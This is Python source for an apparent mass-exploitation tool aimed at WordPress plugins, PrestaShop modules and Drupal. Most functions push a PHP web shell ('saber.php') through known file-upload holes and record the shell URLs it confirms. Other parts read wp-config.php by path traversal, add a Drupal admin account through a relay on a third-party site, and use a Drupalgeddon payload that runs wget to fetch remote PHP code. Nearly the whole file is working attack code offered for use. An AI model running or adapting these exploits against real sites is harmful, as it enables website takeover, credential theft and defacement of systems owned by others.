    #------------Wordpress-------
    #revgetconfig
    def revslidergetconfig(url):
        try : 
            response = urllib2.urlopen(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
            r = requests.get(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
            html = response.read()
            if "DB" in html:
                print color.BOLD+"[Revslider Get Config]-VULUN > "+site
                with open("results/index.txt", 'a') as neo:
                    neo.write("%s" %  site)
                    neo.write("\n")
            else:
                print color.RED+"[revslidergetconfig]-NOT VULUN"
        except :
            pass
    #addblockurl
    def addblockurl(url):
        global up
        try : 
            ShellFile = {'popimg': open('saber.php', 'rb')}
            poc = url+'/wp-admin/admin-ajax.php?action=getcountryuser&cs=2'
            rep = requests.post(url, files=ShellFile)
            now = datetime.datetime.now()
            new = url+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php'
            w = requests.get(new)
            if 'Saber BOT V1' in w.content :
                print color.BOLD+"[AddBlockUrl]-VULUN > "+new
                with open("results/index.txt", 'a') as neo:
                    neo.write("%s" %  new)
                    neo.write("\n")
            else:
                print color.RED+"[AddBlockUrl]-NOT VULUN"
        except:
            print color.RED+"[AddBlockUrl]-NOT VULUN"
            pass
    #cherry
    def cherry(url):
        global cher
        try:
            dirx = '/wp-content/plugins/cherry-plugin/admin/import-export/upload.php'
            xxxxe = url + dirx
            files={'file':(cher, open(cher,'rb'),'multipart/form-data')}
            r = requests.post(xxxxe, files=files)
            bb = cher
            shelldir = '/wp-content/plugins/cherry-plugin/admin/import-export/'+bb
            shelled = url + shelldir
            openbing = urllib2.urlopen(shelled)
            readbing = openbing.read()
            if re.findall("Saber", readbing):
                print color.BOLD+"[Cherry Plugin]-VULUN > "+shelled
                save = open('results/shells.txt', 'a')
                save.write(shelled+'\n')
                save.close()
        except :
            print color.RED+"[Cherry Plugin]-NOT VULUN"
            pass
    def sexycontacoform(site):
        Exploit = '//wp-content/plugins/sexy-contact-form/includes/fileupload/index.php'
        CheckVuln = requests.get(site + Exploit, timeout=5)
        try:
            IndeXfile = {'file[]': open('saber.php', 'rb')}
            GoT = requests.post(site + Exploit, files=IndeXfile, timeout=5)
            check =requests.get(site+'//wp-content/plugins/sexy-contact-form/includes/fileupload/files/saber.php')
            if 'Saber BOT V1' in check.content:
                print color.GREEN+"[SexyContatctForm]-VULUN "+site+'//wp-content/plugins/sexy-contact-form/includes/fileupload/files/saber.php'
                save= open('results/shells.txt', 'a')
                save.write(site+'//wp-content/plugins/sexy-contact-form/includes/fileupload/files/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[SexyContatctForm]-NOT VULUN"
        except:
            print color.RED+"[SexyContatctForm]-NOT VULUN"
            pass
    def reflexgallery(site):
            files = {'qqfile': ('saber.php', open('saber.php', 'rb'), 'multipart/form-data')}
            post = {
                "dm_upload": ""
            }
            now = datetime.datetime.now()
            url = site + "//wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year="+str(now.year)+"&Month="+str(now.month)
            try : 
                req = requests.post(url, files=files)
                ww = requests.get(site+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php')
                if 'Saber BOT V1' in ww.content :
                    print color.BOLD+site+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php'
                    save = open('results/shells.txt', 'a')
                    save.write(site+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php'+'\n')
                    save.close()
                else:
                    print color.RED+"[ReflexGallery]-Not Vulun"
            except :
                    pass
                    print color.RED+"[ReflexGallery]-Not Vulun"

    def wysija(site):
        try:
            FileShell = {'my-theme': open('zebi.zip', 'rb')}
            PostData = {'action': "themeupload", 'submitter': "Upload", 'overwriteexistingtheme': "on",
                    'page': 'GZNeFLoZAb'}
            UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            url = site + "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes"
            GoT = requests.post(url, files=FileShell, data=PostData, headers=UserAgent, timeout=10)
            sh =site + '/wp-content/uploads/wysija/themes/zebi/saber.php'
            CheckShell = requests.get(sh, timeout=5)
            if 'Saber BOT V1' in CheckShell.content :
                print color.GREEN+"[wysija]-VUlun : "+sh
            else:
                print color.RED+"[Wysija]-Not Vulun"
        except:
            print color.RED+"[Wysija]-Not Vulun"
            pass
    def wtffu(site):
        try : 
            ShellFile = {'files[]': open('saber.php', 'rb')}
            Exploit = '//wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            if 'Saber BOT V1' in GoT.content :
                print color.GREEN+"[WorkTheFlow]-Vulun : "+site+'//wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'//wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[WorkTheFlow]-Not Vulun"
        except :
            print color.RED+"[WorkTheFlow]-Not Vulun"
            pass
    def wpshop(site):
        try : 
            ShellFile = {'wpshop_file': open('saber.php', 'rb')}
            Exploit = '/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload/'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            if 'Saber BOT V1' in GoT.content :
                print color.GREEN+"[WPShop]-Vulun"+site+'//wp-content/uploads/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'//wp-content/uploads/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[WPShop]-Not Vulun"
        except :
            print color.RED+"[WPShop]-Not Vulun"
            pass
    def formcaft(site):
        global up
        ww = site+'/wp-content/plugins/formcraft/file-upload/server/php/'
        shell = open(up, "r")
        payload = {"files[]" : shell}
        bypass = {"new_name" : "ss.php"}
        try :
            files={'file':(cher, open(up,'rb'),'multipart/form-data')}
            rep = requests.post(ww, data=bypass, files=payload)
            pp = requests.get(site+'/wp-content/plugins/formcraft/file-upload/server/php/files/saber.php')
            if 'Saber BOT V1' in pp.content:
                print color.GREEN+"[FormCat]-VULUN "+site+'/wp-content/plugins/formcraft/file-upload/server/php/files/saber.php'
                save= open('results/shells.txt', 'a')
                save.write(site+'/wp-content/plugins/formcraft/file-upload/server/php/files/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[FormCaft Plugin]-NOT VULUN"
        except :
            print color.RED+"[FormCaft Plugin]-NOT VULUN"
            pass
    #levo

    #powerzoom

    #gravity
    def gravindex(site):
        global ind
        UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        fileDeface = {'file': open(ind, 'r')}
        post_data = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../../', 'name': 'saber.html'}
        url = site+'/?gf_page=upload'
        try : 
            req = requests.post(url, files=fileDeface, data=post_data)
            if "ok" in req.content :
                print color.GREEN+"[Gravity Form Index]-VULUN > "+site+'//_input_3_saber.html'
                zone(site)
                save= open('results/index.txt', 'a')
                save.write(site+'//_input_3_saber.html'+'\n')
                save.close()
            else:
                print color.RED+"[Gravity Form Index]-NOT VULUN"
        except:
            pass
    def gravity(site):
        global grav
        UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        fileDeface = {'file': open(grav, 'r')}
        post_data = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../', 'name': 'saber.php'}
        url = site+'/?gf_page=upload'
        ww = requests.get(url)
        if not """ {"status" : "error", "error" : {"code": 500, "message": "Failed to upload file."}} """ in ww.content :
            print color.RED+"[GravityForm]-NOT VULUN"
            pass
        else :
            try : 
                req = requests.post(url, files=fileDeface, data=post_data)
                if "ok" in req.content :
                    print color.BOLD+"[Gravity Form]-VULUN > "+site+'/wp-content/uploads/_input_3_saber.php'
                    save= open('results/shells.txt', 'a')
                    save.write(site+'/wp-content/uploads/_input_3_saber.php'+'\n')
                    save.close()
                else:
                    print color.RED+"[Gravity Form Shell]-NOT VULUN"
                    gravindex(site)
            except:
                pass
    def downloadsmanager(site):
            files = {'upfile': ('saber.php', open('saber.php', 'rb'), 'multipart/form-data')}
            post = {
                "dm_upload": ""
            }
            url = site + "//wp-content/plugins/downloads-manager/readme.txt"
            try : 
                req = requests.post(url, files=files, data=post)
                ww = requests.get(site+"/wp-content/plugins/downloads-manager/upload/saber.php")
                if 'Saber BOT V1' in ww.content :
                    print color.BOLD+"[VULUN]-"+site+"//wp-content/plugins/downloads-manager/upload/saber.php"
                    save = open('results/shells.txt', 'a')
                    save.write(site+"//wp-content/plugins/downloads-manager/upload/saber.php"+"\n")
                    save.close()
                else:
                    print color.RED+"[DownloadsManager]-Not Vulun"

            except :
                pass

    def inboundiomarketing(site):
            files = {'file': ('saber.php', open('saber.php', 'rb'), 'multipart/form-data')}
            post = {
                "dm_upload": ""
            }
            url = site + "//wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php"
            try : 
                req = requests.post(url, files=files, data=post)
                ww = requests.get(site+"//wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/saber.php")
                if 'Saber BOT V1' in ww.content :
                    print color.BOLD+site+"//wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/saber.php"
                    save = open('results/shells.txt', 'a')
                    save.write(site+"///wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv//saber.php"+'\n')
                    save.close()
                else:
                    print color.RED+"[InboundioMarketing]-Not Vulun"
            except :
                pass

    def phpeventcalendar(site):
        try : 
            ShellFile = {'files[]': open('saber.php', 'rb')}
            Exploit = '//wp-content/plugins/php-event-calendar/server/file-uploader/'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/wp-content/plugins/php-event-calendar/server/file-uploader/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[PhPCalendarEvenet]-Vulun : "+site+'/wp-content/plugins/php-event-calendar/server/file-uploader/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/wp-content/plugins/php-event-calendar/server/file-uploader/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[PhpCalendarEvent]-Not Vulun"
        except :
            print color.RED+"[PhpCalendarEvent]-Not Vulun"
            pass

    def revslider(site):
            UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            Exploit = site + '/wp-admin/admin-ajax.php'
            data = {'action': "revslider_ajax_action", 'client_action': "update_plugin"}
            FileShell = {'update_file': open(rev, 'rb')}
            CheckRevslider = requests.get(site, timeout=5)
            try : 
                if '/wp-content/plugins/revslider/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'/wp-content/plugins/revslider/temp/update_extract//revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print "[revslider Shell]-VULUN > "+site+'//wp-content/plugins/revslider/temp/update_extract//revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'//wp-content/plugins/revslider/temp/update_extract//revslider/saber.php'+'\n')
                elif '/wp-content/themes/Avada/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+site+"[Revslider Avada Shell]-VULUN > "+site+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
                elif '/wp-content/themes/striking_r/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'//wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+"[Revslider striking_r Shell]-VULUN > "+site+'//wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'//wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
                elif '//wp-content/themes/IncredibleWP/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'//wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+"[Revslider IncredibleWP Shell]-VULUN > "+site+'/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'//wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
                elif '//wp-content/themes/ultimatum/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'//wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+"[Revslider ultimatum Shell]-VULUN > "+site+'/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'//wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
                elif '//wp-content/themes/medicate' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+"[Revslider medicate Shell]-VULUN > "+site+'/wp-content/themes/medicate/script/revslider/temp/update_extract/update_extract/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'//wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/saber.php'+'\n')
                elif '//wp-content/themes/centum/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'/wp-content/themes/centum/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+"[Revslider centum Shell]-VULUN > "+site+'//wp-content/themes/centum/revslider/temp/update_extract/revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'///wp-content/themes/centum/revslider/temp/update_extract/revslider/saber.php'+'\n')
                elif '//wp-content/themes/beach_apollo/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+"[Revslider centum Shell]-VULUN > "+site+'//wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'//wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
                else:
                    print color.RED+"[AddBlockUrl]-NOT VULUN"
                    pass
            except:
                print color.RED+"[Revslider]-Not Vulun"
                pass
    def zoomsound(site):
            files = {'file_field': ('saber.php', open('saber.php', 'rb'), 'multipart/form-data')}
            post = {
                "dm_upload": ""
            }
            url = site + "/wp-content/plugins/dzs-zoomsounds/admin/upload.php"
            try : 
                req = requests.post(url, files=files)
                ww = requests.get(site+"///wp-content/plugins/dzs-zoomsounds/admin/upload/saber.php")
                if 'Saber BOT V1' in ww.content :
                    print color.BOLD+site+"///wp-content/plugins/dzs-zoomsounds/admin/upload/saber.php"
                    save = open('results/shells.txt', 'a')
                    save.write(site+"////wp-content/plugins/dzs-zoomsounds/admin/upload/saber.php"+'\n')
                    save.close()
                else:
                    print color.RED+"[ZoomSound]-Not Vulun"
            except :
                pass
    def showbiz(site):
            global jcsh
            UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            Exploit = site + '/wp-admin/admin-ajax.php'
            data = {'action': "showbiz_ajax_action", 'client_action': "update_plugin"}
            FileShell = {'update_file': open(jcsh, 'rb')}
            CheckRevslider = requests.get(site, timeout=5)
            try : 
                if '/wp-content/plugins/showbiz//' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'/wp-content/plugins/showbiz/temp/update_extract//saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+"[revslider Shell]-VULUN > "+site+'/wp-content/plugins/showbiz/temp/update_extract//saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'/wp-content/plugins/showbiz/temp/update_extract//saber.php'+'\n')
                else:
                    print color.RED+"[ShowBiz]-NOT VULUN"
            except:
                print color.RED+"[ShowBiz]-Not Vulun"
                pass
    def simpleadsmanager(site):
            files = {'uploadfile': ('saber.php', open('saber.php', 'rb'), 'multipart/form-data')}
            post = {
                "action": "upload_ad_image",
                "path": ""
            }
            url = site + "//wp-content/plugins/simple-ads-manager/sam-ajax-admin.php"
            try : 
                req = requests.post(url, files=files, data=post)
                ww = requests.get(site+"//wp-content/plugins/simple-ads-manager/saber.php")
                if 'Saber BOT V1' in ww.content :
                    print color.GREEN+site+"//wp-content/plugins/simple-ads-manager/saber.php"
                    save = open('results/shells.txt', 'a')
                    save.write(site+"//wp-content/plugins/simple-ads-manager/saber.php"+'\n')
                    save.close()
                else:
                    print color.RED+"[SimpleAdsManager]-NOt Vulun"
            except :
                pass
    #prestazebi
    def columnadverts(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/columnadverts/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/columnadverts/slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[PhPCalendarEvenet]-Vulun : "+site+'/modules/columnadverts/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/columnadverts/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[ColumnAdverts]-Not Vulun"
        except :
            print color.RED+"[ColumnAdverts]-Not Vulun"
            pass
    def attributewizardpro(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/attributewizardpro/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[attributewizardpro]-Vulun : "+site+'/modules/attributewizardpro/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/attributewizardpro/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[attributewizardpro]-Not Vulun"
        except :
            print color.RED+"[attributewizardpro]-Not Vulun"
            pass

    def soopamobile(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/soopamobile/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/soopamobile/slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[SoopaMobile]-Vulun : "+site+'/modules/soopamobile/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/soopamobile/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[SoopaMobile]-Not Vulun"
        except :
            print color.RED+"[SoopaMobile]-Not Vulun"
            pass
    def attributewizardproOLD(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/attributewizardproOLD/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[attributewizardproOLD]-Vulun : "+site+'/modules/attributewizardproOLD/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/attributewizardproOLD/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[attributewizardproOLD]-Not Vulun"
        except :
            print color.RED+"[attributewizardproOLD]-Not Vulun"
            pass

    def soopabanners(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/soopabanners/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/soopabanners/slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[soopabanners]-Vulun : "+site+'/modules/soopabanners/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/soopabanners/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[soopabanners]-Not Vulun"
        except :
            print color.RED+"[soopabanners]-Not Vulun"
            pass
    def vtermslideshow(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/vtermslideshow/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/vtermslideshow/slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[vtermslideshow]-Vulun : "+site+'/modules/vtermslideshow/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/vtermslideshow/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[vtermslideshow]-Not Vulun"
        except :
            print color.RED+"[vtermslideshow]-Not Vulun"
            pass
    def simpleslideshow(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/simpleslideshow/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[simpleslideshow]-Vulun : "+site+'/modules/simpleslideshow/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/simpleslideshow/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[simpleslideshow]-Not Vulun"
        except :
            print color.RED+"[simpleslideshow]-Not Vulun"
            pass
    def homepageadvertise2(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/homepageadvertise2/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[homepageadvertise2]-Vulun : "+site+'/modules/homepageadvertise2/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/homepageadvertise2/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[homepageadvertise2]-Not Vulun"
        except :
            print color.RED+"[homepageadvertise2]-Not Vulun"
            pass
    def jro_homepageadvertise(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/jro_homepageadvertise/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[jro_homepageadvertise]-Vulun : "+site+'/modules/jro_homepageadvertise/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/jro_homepageadvertise/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[jro_homepageadvertise]-Not Vulun"
        except :
            print color.RED+"[jro_homepageadvertise]-Not Vulun"
            pass
    def oneattributewizardpro(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/oneattributewizardpro/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[oneattributewizardpro]-Vulun : "+site+'/modules/oneattributewizardpro/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/oneattributewizardpro/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[oneattributewizardpro]-Not Vulun"
        except :
            print color.RED+"[oneattributewizardpro]-Not Vulun"
            pass
    def attributewizardpro_x(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/attributewizardpro_x/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[attributewizardpro_x]-Vulun : "+site+'/modules/attributewizardpro_x/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/attributewizardpro_x/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[attributewizardpro_x]-Not Vulun"
        except :
            print color.RED+"[attributewizardpro_x]-Not Vulun"
            pass

    def productpageadverts(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/productpageadverts/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[productpageadverts]-Vulun : "+site+'/modules/productpageadverts/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/productpageadverts/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[productpageadverts]-Not Vulun"
        except :
            print color.RED+"[productpageadverts]-Not Vulun"
            pass
    def homepageadvertise(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/homepageadvertise/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[homepageadvertise]-Vulun : "+site+'/modules/homepageadvertise/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/homepageadvertise/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[homepageadvertise]-Not Vulun"
        except :
            print color.RED+"[homepageadvertise]-Not Vulun"
            pass
    def videostab(site):
        try : 
            ShellFile = {'userfile': open('saber.php.mp4', 'rb')}
            Exploit = '///modules/videostab/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[videostab]-Vulun : "+site+'/modules/videostab/slides/saber.php.mp4'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/videostab/slides/saber.php.mp4'+'\n')
                save.close()
            else:
                print color.RED+"[videostab]-Not Vulun"
        except :
            print color.RED+"[videostab]-Not Vulun"
            pass
    def wg24themeadministration(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/wg24themeadministration/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[wg24themeadministration]-Vulun : "+site+'/modules/wg24themeadministration/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/wg24themeadministration/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[wg24themeadministration]-Not Vulun"
        except :
            print color.RED+"[wg24themeadministration]-Not Vulun"
            pass
    #drupal
    def drupal(site):
        #upload this script in other shell (or ur localhost) https://pastebin.com/raw/wPAbtyJ4 Thanks Gass <3
        exp = 'http://iphonefixercolchester.co.uk/wp-admin/comment.php'
        po = exp+'?url='+site+'&submit=submit'
        try : 
            zeb = requests.get(po)
            if 'Success' in zeb.content :
                print color.GREEN+"[Drupal ADD Admin]-Vulun : "+site+' User:gassrini pass :admin'
                save = open('results/drupal.txt')
                save.write(site+':gassrini:admin'+'\n')
                save.close()
            else:
                print color.RED+"[Drupal ADD Admin]-Not Vulun"
        except:
            print color.RED+"[Drupal ADD Admin]-Not Vulun"
            pass

    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/dr-iman/SpiderProject/master/lib/exploits/web-app/wordpress/ads-manager/payload.php'}
    headers = {'User-Agent': 'Mozilla 5.0'}
    def drugeddon(u):
        try:
